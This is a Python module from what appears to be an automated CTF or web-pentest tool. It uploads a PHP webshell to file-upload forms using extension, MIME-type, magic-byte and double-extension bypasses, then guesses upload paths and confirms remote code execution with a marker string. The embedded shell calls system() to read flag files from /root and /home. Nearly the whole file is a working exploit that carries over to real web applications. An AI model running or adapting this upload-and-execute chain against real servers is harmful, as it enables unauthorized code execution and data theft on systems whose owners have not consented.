"""
File upload bypass attack module.
Attempts PHP webshell upload via extension, content-type, and magic byte bypass techniques.
RCE confirmed with unique marker — no finding reported without confirmed execution.
"""
from __future__ import annotations
import re
from urllib.parse import urlparse, urljoin
from uuid import uuid4

from attacks.base import BaseAttack, SessionExpiredError
from engine.flag_hunter import extract_interesting_data, has_definite_flag
from rich.console import Console

console = Console(legacy_windows=False)

_MARKER = "TWEB_RCE_PROBE"
_SHELL = (
    f"<?php echo '{_MARKER}'; "
    "system('cat /flag* 2>/dev/null; "
    "cat /root/flag.txt 2>/dev/null; "
    "cat /home/*/flag* 2>/dev/null'); ?>"
)
_GIF_SHELL = "GIF89a\n" + _SHELL

# Each payload uses a unique filename — no overwrite risk between iterations.
BYPASS_PAYLOADS: list[tuple[str, str, bytes]] = [
    ("tweb1.php",      "application/octet-stream", _SHELL.encode()),      # basic
    ("tweb2.php5",     "application/octet-stream", _SHELL.encode()),      # Apache alt ext
    ("tweb3.phtml",    "application/octet-stream", _SHELL.encode()),      # Apache alt ext
    ("tweb4.phar",     "application/octet-stream", _SHELL.encode()),      # PHP archive
    ("tweb5.PHP",      "application/octet-stream", _SHELL.encode()),      # uppercase bypass
    ("tweb6.php",      "image/jpeg",               _SHELL.encode()),      # MIME spoof
    ("tweb7.php",      "image/gif",                _SHELL.encode()),      # MIME spoof
    ("tweb8.php",      "image/png",                _SHELL.encode()),      # MIME spoof
    ("tweb9.gif.php",  "image/gif",                _GIF_SHELL.encode()),  # magic byte
    ("tweb10.jpg.php", "image/jpeg",               _SHELL.encode()),      # double ext
]

UPLOAD_PATHS = [
    "/uploads/", "/upload/", "/files/", "/file/",
    "/images/", "/img/", "/media/", "/static/",
    "/assets/", "/tmp/", "/content/", "/data/",
    "/public/", "/storage/",
    "/static/uploads/", "/assets/uploads/",
    "/user/uploads/", "/public/uploads/",
]

_PATH_IN_BODY = re.compile(
    r'(?:["\'\s>:,(]|^)(\.{0,2}/[/a-zA-Z0-9_.~-]{1,80}\.(php[0-9a-zA-Z]*|phtml|phar)|[a-zA-Z0-9_][/a-zA-Z0-9_.~-]{1,80}\.(php[0-9a-zA-Z]*|phtml|phar))(?:["\'\s<:,);]|$)',
    re.MULTILINE,
)
_SRC_RE = re.compile(r'(?:src|href|action)\s*=\s*["\']([^"\']{1,300})["\']', re.IGNORECASE)
_UPLOAD_HINT_DIRS = ("upload", "file", "image", "img", "media", "product", "asset", "content")


class UploadAttack(BaseAttack):
    name = "upload"
    _seen_urls: set[str] = set()

    def _is_relevant(self, attack_point: dict) -> bool:
        return attack_point.get("input_type") == "file"

    def _find_paths_in_response(self, body: str, filename: str) -> list[str]:
        stem = filename.rsplit(".", 1)[0]
        _upload_dirs = ("upload", "file", "image", "img", "media", "asset", "static", "content")
        exact: list[str] = []
        fallback: list[str] = []
        for m in _PATH_IN_BODY.finditer(body):
            path = "/" + m.group(1).lstrip("/")
            if stem in path or filename in path:
                exact.append(path)
            elif any(d in path.lower() for d in _upload_dirs):
                fallback.append(path)
        # Exact matches first, then upload-dir candidates (server renamed the file)
        seen: set[str] = set()
        result: list[str] = []
        for p in exact + fallback:
            if p not in seen:
                seen.add(p)
                result.append(p)
        return result

    def _base_url(self, url: str) -> str:
        p = urlparse(url)
        return f"{p.scheme}://{p.netloc}"

    async def _check_exec(self, file_url: str, debug: bool = False) -> tuple[bool, list[dict]]:
        try:
            resp = await self.session.get(file_url, timeout=10.0)
        except SessionExpiredError:
            raise
        except Exception:
            return False, []

        body = resp.text or ""
        if debug and resp.status_code in (200, 403):
            console.print(f"  [dim][Upload] probe {resp.status_code} → {file_url}[/dim]")
        if _MARKER not in body:
            return False, []
        # PHP executed: marker appears in output. PHP not executed: file is served
        # as raw text and the source line `echo 'TWEB_RCE_PROBE'` contains the marker.
        if f"echo '{_MARKER}'" in body:
            return False, []

        console.print(f"  [bold red][Upload][/bold red] RCE! {file_url}")
        findings: list[dict] = [{
            "type": "upload_rce",
            "value": f"File upload RCE @ {file_url}",
            "confidence": 0.95,
        }]
        extra = extract_interesting_data(resp.text)
        findings.extend(extra)
        return True, findings

    async def run(self, attack_point: dict, _payloads: list[str]) -> list[dict]:
        if not self._is_relevant(attack_point):
            return []

        url = attack_point["url"]
        if url in UploadAttack._seen_urls:
            return []
        UploadAttack._seen_urls.add(url)

        file_param = attack_point.get("param") or "file"
        raw_extra = attack_point.get("extra_data") or {}
        other_data = {
            k: (str(v) or "1") if not isinstance(v, str) else (v or "1")
            for k, v in raw_extra.items()
            if k != file_param and k.upper() != "MAX_FILE_SIZE"
        }

        base = self._base_url(url)
        console.print(f"  [cyan][Upload][/cyan] POST {url} ?{file_param}")

        # Unique prefix per attack_point — prevents cross-endpoint false positives
        # when a previously uploaded file persists on the server.
        _uid = uuid4().hex[:6]
        local_payloads = [
            (fname.replace("tweb", f"tweb{_uid}", 1), ct, content)
            for fname, ct, content in BYPASS_PAYLOADS
        ]

        for fname, ct, content in local_payloads:
            if self._should_stop():
                return []

            try:
                resp = await self.session.post(
                    url,
                    files={file_param: (fname, content, ct)},
                    data=other_data if other_data else None,
                    timeout=15.0,
                )
            except SessionExpiredError:
                raise
            except Exception:
                continue

            if resp is None or resp.status_code not in (200, 201, 302):
                console.print(f"  [dim][Upload] {fname} → HTTP {resp.status_code if resp else 'None'}, atlandı[/dim]")
                continue

            body = resp.text or ""

            # Check if server executed the shell inline (some CTF apps echo file content).
            # Guard: if the server echoed back raw PHP source, the marker appears
            # in the echo statement itself — not as executed output.
            if _MARKER in body and f"echo '{_MARKER}'" not in body:
                console.print(f"  [bold red][Upload][/bold red] RCE (inline)! {fname} @ {url}")
                findings: list[dict] = [{
                    "type": "upload_rce",
                    "value": f"File upload RCE (inline) @ {url} file={fname}",
                    "confidence": 0.95,
                }]
                findings.extend(extract_interesting_data(body))
                if has_definite_flag(findings):
                    self.stop_event.set()
                return findings

            # Build candidate URLs for the uploaded file
            upload_ok = "success" in body.lower()
            response_paths = self._find_paths_in_response(body, fname)
            console.print(
                f"  [dim][Upload] {fname} → HTTP {resp.status_code}"
                f" | ok={upload_ok} | response_paths={response_paths}"
                f" | body_snippet={body[:200]!r}[/dim]"
            )
            candidates: list[str] = []
            for p in response_paths:
                candidates.append(urljoin(base, p))
            # Mine all src/href/action attrs in response body for upload-directory paths
            if upload_ok:
                for m in _SRC_RE.finditer(body):
                    p = m.group(1)
                    if p.startswith(("data:", "#", "javascript:")):
                        continue
                    if any(d in p.lower() for d in _UPLOAD_HINT_DIRS):
                        if not p.startswith(("http://", "https://")):
                            p = "/" + p.lstrip("/")
                            candidates.insert(0, urljoin(base, p))
                        else:
                            candidates.insert(0, p)
            # Try upload paths relative to the form's own directory (e.g. /adminpanel/uploads/)
            _url_dir = "/".join(urlparse(url).path.split("/")[:-1])
            for upath in UPLOAD_PATHS:
                candidates.append(f"{base}{_url_dir}{upath}{fname}")
            # Absolute paths from root as fallback
            for upath in UPLOAD_PATHS:
                candidates.append(urljoin(base, upath + fname))

            for file_url in candidates[:40]:
                if self._should_stop():
                    return []
                rce, findings = await self._check_exec(file_url, debug=upload_ok)
                if rce:
                    if has_definite_flag(findings):
                        self.stop_event.set()
                    return findings

        return []
